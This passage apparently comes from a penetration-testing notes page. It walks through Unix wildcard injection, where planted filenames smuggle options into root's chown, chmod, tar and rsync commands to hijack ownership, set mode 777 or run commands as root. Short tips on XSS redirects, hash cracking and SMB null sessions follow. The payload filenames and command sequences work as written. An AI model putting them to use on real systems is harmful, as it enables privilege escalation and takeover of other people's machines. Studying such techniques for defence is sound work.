</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw&mdash;-.  1 leon leon   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   94 Oct 28 17:35 script.php</span></code></pre></td></tr></table></div></figure>
Something is not right&hellip; What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group &lsquo;nobody&rsquo;, but somehow, all files are owned by the user &lsquo;leon&rsquo; now.</p>

<p>If we take closer look, this directory previously contained just the following two files created and owned by the user &lsquo;leon&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php</span></code></pre></td></tr></table></div></figure>
Thing is that wildcard character used in &lsquo;chown&rsquo; command line took arbitrary &lsquo;&ndash;reference=.drf.php&rsquo; file and passed it to the chown command at the command line as an option.</p>

<p>Let&rsquo;s check chown manual page (man chown):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   &ndash;reference=RFILE
</span><span class='line'>          use RFILE&rsquo;s owner and group rather than specifying OWNER:GROUP values</span></code></pre></td></tr></table></div></figure>
So in this case, &lsquo;&ndash;reference&rsquo; option to &lsquo;chown&rsquo; will override &lsquo;nobody:nobody&rsquo; specified as the root, and new owner of files in this directory will be exactly same as the owner of &lsquo;.drf.php&rsquo;, which is in this case user &lsquo;leon&rsquo;. Just for the record, &lsquo;.drf&rsquo; is short for Dummy Reference File. :)</p>

<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the &ndash;reference option, file that&rsquo;s owned by some other user, not &lsquo;leon&rsquo;, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership
of files to arbitrary users, and practically &ldquo;hijack&rdquo; files that are of interest to us.</p>

<p>Even more, if user &lsquo;leon&rsquo; previously created a symbolic link in that directory that points to let&rsquo;s say /etc/shadow, ownership of /etc/shadow would also be changed to the user &lsquo;leon&rsquo;.
</li>
<li><strong>Chmod file reference trick</strong></p>

<p>Another interesting attack vector similar to previously described &lsquo;chown&rsquo; attack is &lsquo;chmod&rsquo;. Chmod also has &ndash;reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard.
Chmod manual page (man chmod):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   &ndash;reference=RFILE
</span><span class='line'>          use RFILE&rsquo;s mode instead of MODE values</span></code></pre></td></tr></table></div></figure>
Example is presented below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 29 00:41 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    94 Oct 28 17:38 script.php</span></code></pre></td></tr></table></div></figure>
Superuser will now try to set mode 000 on all files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# chmod 000 *</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s check permissions on files&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 29 00:41 &ndash;reference=.drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</span></code></pre></td></tr></table></div></figure>
What happened? Instead of 000, all files are now set to mode 777 because of the &lsquo;&ndash;reference&rsquo; option supplied through file name.. Once again, file .drf.php owned by user &lsquo;leon&rsquo; with mode 777 was used as reference file and since &ndash;reference option is supplied, all files will be set to mode 777. Beside just &ndash;reference option, attacker can also create another file with
&lsquo;-R&rsquo; filename, to change file permissions on files in all subdirectories recursively. </li></p>

<p><li><strong>Tar arbitrary command execution</strong></p>

<p>Previous example is nice example of file ownership hijacking. Now, let&rsquo;s go to even more interesting stuff like arbitrary command execution. Tar is very common unix program
for creating and extracting archives.
Common usage for lets say creating archives is:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# tar cvvf archive.tar *</span></code></pre></td></tr></table></div></figure>
So, what&rsquo;s the problem with &lsquo;tar&rsquo;? Thing is that tar has many options, and among them, there some pretty interesting options from arbitrary parameter injection point of view.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Let&rsquo;s check tar manual page (man tar):
</span><span class='line'>
</span><span class='line'>      &ndash;checkpoint[=NUMBER]
</span><span class='line'>              display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>       &ndash;checkpoint-action=ACTION
</span><span class='line'>              execute ACTION on each checkpoint</span></code></pre></td></tr></table></div></figure>
There is &lsquo;&ndash;checkpoint-action&rsquo; option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.</p>

<p>Check the following directory:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:19 &ndash;checkpoint=1
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:17 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span></code></pre></td></tr></table></div></figure>
Now, for example, root user wants to create archive of all files in current directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# tar cf archive.tar *
</span><span class='line'>
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></code></pre></td></tr></table></div></figure>
Boom! What happened? /usr/bin/id command gets executed! We&rsquo;ve just achieved arbitrary command
execution under root privileges.
Once again, there are few files created by user &lsquo;leon&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:19 &ndash;checkpoint=1
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Oct 28 19:17 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</span></code></pre></td></tr></table></div></figure>
Options &lsquo;&ndash;checkpoint=1&rsquo; and &lsquo;&ndash;checkpoint-action=exec=sh shell.sh&rsquo; are passed to the &lsquo;tar&rsquo; program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell.sh
</span><span class='line'>/usr/bin/id</span></code></pre></td></tr></table></div></figure>
So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the &lsquo;root&rsquo; account above.
</li></p>

<p><li><strong>Rsync arbitrary command execution</strong></p>

<p>Rsync is &ldquo;a fast, versatile, remote (and local) file-copying tool&rdquo;, that is very common on Unix systems. If we check &lsquo;rsync&rsquo; manual page, we can again find options that can be abused for arbitrary command execution.</p>

<p>Rsync manual:
&ldquo;You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.&rdquo;</p>

<p>Interesting rsync option from manual:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> -e, &ndash;rsh=COMMAND           specify the remote shell to use
</span><span class='line'>     &ndash;rsync-path=PROGRAM    specify the rsync to run on remote machine</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s abuse one example directly from the &lsquo;rsync&rsquo; manual page. Following example will copy all C files in local directory to a remote host &lsquo;foo&rsquo; in &lsquo;/src&rsquo; directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># rsync -t <em>.c foo:src/</span></code></pre></td></tr></table></div></figure>
Directory content:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span></code></pre></td></tr></table></div></figure>
Now root will try to copy all C files to the remote server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# rsync -t </em>.c foo:src/
</span><span class='line'>
</span><span class='line'>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
</span><span class='line'>rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s see what happened&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 76
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
</span><span class='line'>drwx&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 root root   101 Mar 28 04:49 shell_output.txt</span></code></pre></td></tr></table></div></figure>
There were two files owned by user &lsquo;leon&rsquo;, as listed below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span></code></pre></td></tr></table></div></figure>
After &lsquo;rsync&rsquo; execution, new file shell_output.txt whose owner is root is created in same directory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-r&ndash;r&ndash;.  1 root root   101 Mar 28 04:49 shell_output.txt</span></code></pre></td></tr></table></div></figure>
If we check its content, following data is found.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell_output.txt
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></code></pre></td></tr></table></div></figure>
Trick is that because of the &lsquo;*.c&rsquo; wildcard, &lsquo;rsync&rsquo; got &lsquo;-e sh shell.c&rsquo; option on command line, and shell.c will be executed upon &lsquo;rsync&rsquo; start.
Content of shell.c is presented below.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# cat shell.c
</span><span class='line'>/usr/bin/id &gt; shell_output.txt</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</ol></p>

<p><strong>Tips and Tricks:</strong>
<ol>
<li>run-parts: run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>run-parts /etc/cron.daily</span></code></pre></td></tr></table></div></figure>
</li>
<li>Sudoers file:
if the sudoers file contains:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>secure_path
</span><span class='line'>Path used for every command run from sudo. If you don&rsquo;t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.
</span><span class='line'>
</span><span class='line'>env_reset
</span><span class='line'>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller&rsquo;s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.
</span><span class='line'>
</span><span class='line'>mail_badpass
</span><span class='line'>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</span></code></pre></td></tr></table></div></figure></li>
<li>XSS/ HTML Injection:</p>

<p>The below will redirect the page to google.com
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;META http-equiv=&ldquo;refresh&rdquo; content=&ldquo;0;URL=<a href="http://www.google.com">http://www.google.com</a>&rdquo;&gt;</span></code></pre></td></tr></table></div></figure></li>
<li>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password. </li>
<li>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)<a href="https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/">https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</a></li></p>

<p><li>Identification of OS:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/os-release
</span><span class='line'>
</span><span class='line'>NAME=&ldquo;Ubuntu&rdquo;
</span><span class='line'>VERSION=&ldquo;16.04 LTS (Xenial Xerus)&rdquo;
</span><span class='line'>ID=ubuntu
</span><span class='line'>ID_LIKE=debian
</span><span class='line'>PRETTY_NAME=&ldquo;Ubuntu 16.04 LTS&rdquo;
</span><span class='line'>VERSION_ID=&ldquo;16.04&rdquo;
</span><span class='line'>HOME_URL=&ldquo;<a href="http://www.ubuntu.com/">http://www.ubuntu.com/</a>&rdquo;
</span><span class='line'>SUPPORT_URL=&ldquo;<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>&rdquo;
</span><span class='line'>BUG_REPORT_URL=&ldquo;<a href="http://bugs.launchpad.net/ubuntu/">http://bugs.launchpad.net/ubuntu/</a>&rdquo;
</span><span class='line'>UBUNTU_CODENAME=xenial
</span></code></pre></td></tr></table></div></figure></li></p>

<p><li>Java keystore file: <a href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores</a> and <a href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats</a></li>
<li>Cracking MD5 Hashes: Try <a href="https://crackstation.net/">https://crackstation.net/</a></li>
<li>Find files by wheel/ adm users.</li>
<li>Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if &ldquo;Policy of Truth&rdquo; is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist</li>
<li>When you see something like this &ldquo;Nick&rsquo;s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&rdquo;. Which says, only this can see me. Try to see what user-agent it is talking about.</p>

<p>The way it is implemented is by use of .htaccess file
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .htaccess
</span><span class='line'>BrowserMatchNoCase &ldquo;iPhone&rdquo; allowed
</span><span class='line'>
</span><span class='line'>Order Deny,Allow
</span><span class='line'>Deny from ALL
</span><span class='line'>Allow from env=allowed
</span><span class='line'>ErrorDocument 403 &ldquo;&lt;H1&gt;Nick&rsquo;s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;&rdquo;</span></code></pre></td></tr></table></div></figure></li>
<li>Port 139 Open
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbclient -N -L 192.168.1.2
</span><span class='line'>WARNING: The &ldquo;syslog&rdquo; option is deprecated
</span><span class='line'>Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
</span><span class='line'>
</span><span class='line'>  Sharename       Type      Comment
</span><span class='line'>  &mdash;&mdash;&mdash;       &mdash;-      &mdash;&mdash;-
</span><span class='line'>  print$          Disk      Printer Drivers
</span><span class='line'>  kathy           Disk      Fred, What are we doing here?
</span><span class='line'>  tmp             Disk      All temporary files should be stored here
</span><span class='line'>  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
</span><span class='line'>Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
</span><span class='line'>
</span><span class='line'>  Server               Comment
</span><span class='line'>  &mdash;&mdash;&mdash;            &mdash;&mdash;-
</span><span class='line'>  RED                  red server (Samba, Ubuntu)
</span><span class='line'>
</span><span class='line'>  Workgroup            Master
</span><span class='line'>  &mdash;&mdash;&mdash;            &mdash;&mdash;-
</span><span class='line'>  WORKGROUP            RED
</span><span class='line'>
</span><span class='line'>-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password.
